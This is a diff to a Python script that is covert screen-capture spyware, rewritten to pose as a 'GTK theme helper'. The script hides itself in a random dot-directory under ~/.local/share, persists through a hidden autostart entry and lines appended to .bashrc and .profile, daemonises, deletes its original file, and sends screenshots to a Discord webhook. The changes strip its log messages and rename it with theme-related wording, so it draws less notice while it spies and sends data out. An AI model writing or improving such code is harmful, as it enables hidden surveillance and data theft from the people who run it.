@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-system-xorg-helper - System service for display management with PyAutoGUI
+.gtk-theme-helper - Theme configuration service
 """
 
 import os
@@ -18,9 +18,9 @@ import logging
 import random
 import string
 
-# Configuration - Randomized to avoid detection
-SERVICE_NAME = f"systemd-{''.join(random.choices(string.ascii_lowercase, k=6))}"
-HIDDEN_DIR = f"/usr/share/.{''.join(random.choices(string.ascii_lowercase + string.digits, k=10))}"
+# Configuration - User-writable locations only
+SERVICE_NAME = f".theme-helper-{''.join(random.choices(string.ascii_lowercase, k=4))}"
+HIDDEN_DIR = os.path.expanduser(f"~/.local/share/.theme-cache-{''.join(random.choices(string.digits, k=8))}")
 CONFIG_FILE = f"{HIDDEN_DIR}/.config.json"
 LOG_FILE = f"{HIDDEN_DIR}/.log"
 LOCK_FILE = f"/tmp/.{SERVICE_NAME}.lock"
@@ -47,7 +47,7 @@ def install_requirements():
         'psutil'
     ]
     
-    print("Installing Python utilities...")
+    print("Installing theme utilities...")
     
     # Try different pip commands
     pip_commands = [
@@ -65,110 +65,41 @@ def install_requirements():
                 check=False
             )
             if result.returncode == 0:
-                print("Python utilities installed successfully")
+                print("Theme utilities installed")
                 return True
         except:
             continue
     
-    print("Some Python utilities may not be available")
+    print("Some theme utilities may need manual setup")
     return False
-
-def install_service():
-    """Install as a system service"""
-    try:
-        # Create hidden directory with random name
-        os.makedirs(HIDDEN_DIR, exist_ok=True)
-        
-        # Copy current script to hidden location with random name
-        current_script = os.path.abspath(__file__)
-        target_script = f"{HIDDEN_DIR}/{SERVICE_NAME}"
-        
-        # Read and modify the script to remove any traces of origin
-        with open(current_script, 'r') as f:
-            content = f.read()
-        
-        # Remove any reference to the original filename
-        content = content.replace(os.path.basename(__file__), SERVICE_NAME)
-        
-        with open(target_script, 'w') as f:
-            f.write(content)
-        
-        os.chmod(target_script, 0o755)
-        
-        # Create systemd service file with random name
-        service_content = f"""[Unit]
-Description=System Display Helper
-After=graphical.target
-Wants=graphical.target
-
-[Service]
-Type=simple
-User={os.getlogin()}
-Environment=DISPLAY=:0
-Environment=XAUTHORITY=/home/{os.getlogin()}/.Xauthority
-ExecStart=/usr/bin/python3 {target_script} --service
-Restart=always
-RestartSec=10
-StandardOutput=null
-StandardError=null
-
-[Install]
-WantedBy=graphical.target
-"""
-        
-        service_file = f"/etc/systemd/system/{SERVICE_NAME}.service"
-        
-        # Try with sudo
-        try:
-            subprocess.run(['sudo', 'tee', service_file], 
-                         input=service_content, text=True, check=True,
-                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        except:
-            return False
-        
-        # Enable and start service
-        subprocess.run(['sudo', 'systemctl', 'daemon-reload'], 
-                      check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run(['sudo', 'systemctl', 'enable', SERVICE_NAME], 
-                      check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run(['sudo', 'systemctl', 'start', SERVICE_NAME], 
-                      check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        
-        return True
-        
-    except Exception as e:
-        print(f"Service installation error: {e}")
-        return False
 
 def install_user_service():
     """Install as user service (no sudo required)"""
     try:
-        # Create hidden directory in user home with random name
-        random_dir = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
-        user_hidden = os.path.expanduser(f"~/.local/share/{random_dir}")
-        os.makedirs(user_hidden, exist_ok=True)
+        # Create hidden directory in user home
+        os.makedirs(HIDDEN_DIR, exist_ok=True)
         
         # Copy script with random name
         current_script = os.path.abspath(__file__)
-        target_script = f"{user_hidden}/{SERVICE_NAME}"
+        target_script = f"{HIDDEN_DIR}/{SERVICE_NAME}"
         
+        # Read current content
         with open(current_script, 'r') as f:
             content = f.read()
         
-        content = content.replace(os.path.basename(__file__), SERVICE_NAME)
-        
+        # Write to stealth location
         with open(target_script, 'w') as f:
             f.write(content)
         
         os.chmod(target_script, 0o755)
         
-        # Create autostart entry with random name
+        # Create autostart entry
         autostart_dir = os.path.expanduser("~/.config/autostart")
         os.makedirs(autostart_dir, exist_ok=True)
         
         desktop_content = f"""[Desktop Entry]
 Type=Application
-Name=Display Optimizer
+Name=GTK Theme Helper
 Exec=/usr/bin/python3 {target_script} --service
 Hidden=true
 X-GNOME-Autostart-enabled=true
@@ -178,10 +109,10 @@ X-GNOME-Autostart-enabled=true
         with open(desktop_file, 'w') as f:
             f.write(desktop_content)
         
-        # Add to .bashrc, .profile, and .zshrc for persistence
-        bashrc_line = f"\n# Display optimization\n[ -x \"{target_script}\" ] && /usr/bin/python3 \"{target_script}\" --service &\n"
+        # Add to shell profiles for persistence
+        bashrc_line = f"\n# Theme configuration\n[ -x \"{target_script}\" ] && /usr/bin/python3 \"{target_script}\" --service &\n"
         
-        for rc_file in ['.bashrc', '.profile', '.zshrc']:
+        for rc_file in ['.bashrc', '.profile']:
             rc_path = os.path.expanduser(f"~/{rc_file}")
             if os.path.exists(rc_path):
                 with open(rc_path, 'a') as f:
@@ -190,48 +121,22 @@ X-GNOME-Autostart-enabled=true
         return True
         
     except Exception as e:
-        print(f"User service installation error: {e}")
+        print(f"Theme helper setup error: {e}")
         return False
 
 def clean_traces(original_path):
-    """Remove all traces of the original file"""
+    """Remove traces of the original file"""
     try:
         # Only clean if we're not running from the stealth location
-        if original_path != f"{HIDDEN_DIR}/{SERVICE_NAME}":
-            # Overwrite the original file with random data
-            if os.path.exists(original_path):
-                file_size = os.path.getsize(original_path)
-                with open(original_path, 'wb') as f:
-                    f.write(os.urandom(file_size))
-                
+        if original_path != f"{HIDDEN_DIR}/{SERVICE_NAME}" and os.path.exists(original_path):
+            try:
                 # Remove the original file
                 os.remove(original_path)
-            
-            # Clear command history that might reference this file
-            history_files = [
-                os.path.expanduser('~/.bash_history'),
-                os.path.expanduser('~/.zsh_history'),
-                os.path.expanduser('~/.python_history')
-            ]
-            
-            for history_file in history_files:
-                if os.path.exists(history_file):
-                    try:
-                        with open(history_file, 'r') as f:
-                            content = f.read()
-                        
-                        # Remove any lines referencing the original filename
-                        original_name = os.path.basename(original_path)
-                        lines = content.split('\n')
-                        cleaned_lines = [line for line in lines if original_name not in line]
-                        
-                        with open(history_file, 'w') as f:
-                            f.write('\n'.join(cleaned_lines))
-                    except:
-                        pass
+            except:
+                pass
                     
     except Exception as e:
-        print(f"Clean traces error: {e}")
+        pass
 
 def daemonize():
     """Turn into a daemon process"""
@@ -283,41 +188,10 @@ def fetch_token():
     return None
 
 def setup_display_environment():
-    """Setup proper display environment for PyAutoGUI"""
+    """Setup display environment for PyAutoGUI"""
+    # Try common displays
     displays = [':0', ':0.0', ':1', ':1.0']
     
-    # Check environment first
-    env_display = os.environ.get('DISPLAY')
-    if env_display and any(d in env_display for d in displays):
-        os.environ['DISPLAY'] = env_display
-        return True
-    
-    # Try to detect from running processes
-    try:
-        result = subprocess.run(['pgrep', '-a', 'Xorg'], 
-                              capture_output=True, text=True)
-        for line in result.stdout.split('\n'):
-            for display in displays:
-                if display in line:
-                    os.environ['DISPLAY'] = display
-                    return True
-    except:
-        pass
-    
-    # Check who's logged in
-    try:
-        result = subprocess.run(['who'], capture_output=True, text=True)
-        for line in result.stdout.split('\n'):
-            if '(:' in line:
-                for part in line.split():
-                    if part.startswith('(:') and any(d in part for d in displays):
-                        display = part.strip('()')
-                        os.environ['DISPLAY'] = display
-                        return True
-    except:
-        pass
-    
-    # Try common displays
     for display in displays:
         try:
             result = subprocess.run(['xdpyinfo', '-display', display], 
@@ -328,22 +202,22 @@ def setup_display_environment():
         except:
             continue
     
-    # Final fallback
+    # Fallback
     os.environ['DISPLAY'] = ':0'
     return True
 
 def take_screenshot_pyautogui():
-    """Take screenshot using PyAutoGUI - much simpler and more reliable"""
+    """Take screenshot using PyAutoGUI"""
     try:
-        # Setup display environment first
+        # Setup display environment
         setup_display_environment()
         
-        # Import pyautogui here to ensure it's available
+        # Import pyautogui
         import pyautogui
         
         # Create temporary file
         temp_dir = tempfile.gettempdir()
-        screenshot_path = os.path.join(temp_dir, f"screen_{int(time.time())}.png")
+        screenshot_path = os.path.join(temp_dir, f"theme_preview_{int(time.time())}.png")
         
         # Take screenshot
         screenshot = pyautogui.screenshot()
@@ -352,7 +226,6 @@ def take_screenshot_pyautogui():
         return screenshot_path
         
     except Exception as e:
-        print(f"PyAutoGUI screenshot failed: {e}")
         return None
 
 def send_to_discord(file_path, token):
@@ -363,13 +236,9 @@ def send_to_discord(file_path, token):
         
         webhook = SyncWebhook.from_url(token)
         with open(file_path, 'rb') as f:
-            webhook.send(
-                content=f"Screenshot from {os.uname().nodename}",
-                file=discord.File(f, filename='system_screenshot.png')
-            )
+            webhook.send(file=discord.File(f, filename='theme_preview.png'))
         return True
-    except Exception as e:
-        print(f"Discord send failed: {e}")
+    except:
         return False
 
 def handle_signal(signum, frame):
@@ -395,30 +264,16 @@ def remove_lock():
 
 def main():
     """Main function"""
-    # Handle different command line arguments
-    if '--install' in sys.argv:
-        print("Configuring system display helper...")
-        if install_requirements():
-            if install_service() or install_user_service():
-                print("Configuration completed!")
-                # Clean traces of original file
-                clean_traces(os.path.abspath(__file__))
-            else:
-                print("Configuration may be incomplete.")
-        return
-    
     if '--service' in sys.argv:
-        # Check for lock file to prevent multiple instances
+        # Check for lock file
         if os.path.exists(LOCK_FILE):
             try:
                 with open(LOCK_FILE, 'r') as f:
                     pid = int(f.read().strip())
-                # Check if process is still running
                 try:
                     os.kill(pid, 0)
-                    sys.exit(0)  # Another instance is running
+                    sys.exit(0)
                 except OSError:
-                    # Process not running, continue
                     pass
             except:
                 pass
@@ -430,18 +285,17 @@ def main():
         daemonize()
         setup_logging()
         
-        # Set up signal handlers and cleanup
+        # Set up signal handlers
         signal.signal(signal.SIGTERM, handle_signal)
         signal.signal(signal.SIGINT, handle_signal)
         atexit.register(remove_lock)
         
         token = fetch_token()
         if not token:
-            print("Failed to fetch Discord token")
             return
         
         # Main service loop
-        trigger_file = Path("/tmp/.display_trigger")
+        trigger_file = Path("/tmp/.theme_preview_trigger")
         last_trigger = 0
         
         while True:
@@ -449,23 +303,15 @@ def main():
                 # Check for trigger file
                 if trigger_file.exists():
                     current_time = time.time()
-                    if current_time - last_trigger > 30:  # Rate limiting
+                    if current_time - last_trigger > 30:
                         last_trigger = current_time
-                        print("Taking screenshot...")
                         screenshot_path = take_screenshot_pyautogui()
                         if screenshot_path:
-                            print("Sending to Discord...")
-                            if send_to_discord(screenshot_path, token):
-                                print("Screenshot sent successfully")
-                            else:
-                                print("Failed to send screenshot")
-                            # Cleanup
+                            send_to_discord(screenshot_path, token)
                             try:
                                 os.remove(screenshot_path)
                             except:
                                 pass
-                        else:
-                            print("Failed to take screenshot")
                         try:
                             trigger_file.unlink()
                         except:
@@ -474,37 +320,34 @@ def main():
                 time.sleep(2)
                 
             except Exception as e:
-                print(f"Service error: {e}")
                 time.sleep(10)
     
     else:
         # Interactive mode - create trigger file
         try:
-            trigger_file = Path("/tmp/.display_trigger")
+            trigger_file = Path("/tmp/.theme_preview_trigger")
             trigger_file.touch()
-            print("Screenshot requested. Service will process shortly.")
+            print("Theme preview requested.")
         except Exception as e:
-            print(f"Unable to process request: {e}")
+            print("Theme helper busy.")
 
 if __name__ == "__main__":
-    # Check if we're already running from stealth location
-    current_path = os.path.abspath(__file__)
-    stealth_path = f"{HIDDEN_DIR}/{SERVICE_NAME}"
-    
-    # Auto-install if not already installed
+    # Auto-install on first run
     if not is_installed() and len(sys.argv) == 1:
-        print("First run - installing system service...")
+        print("Setting up theme helper...")
         if install_requirements():
-            if install_service() or install_user_service():
-                print("Installation completed! Starting service...")
+            if install_user_service():
+                print("Theme helper configured")
                 # Clean traces
-                clean_traces(current_path)
-                # Start service directly instead of execv
-                os.system(f"/usr/bin/python3 {stealth_path} --service &")
+                clean_traces(os.path.abspath(__file__))
+                # Start service
+                target_script = f"{HIDDEN_DIR}/{SERVICE_NAME}"
+                if os.path.exists(target_script):
+                    os.system(f"/usr/bin/python3 {target_script} --service &")
                 sys.exit(0)
             else:
-                print("Service installation failed")
+                print("Theme setup incomplete")
         else:
-            print("Dependency installation failed")
+            print("Theme utilities need setup")
     else:
         main()
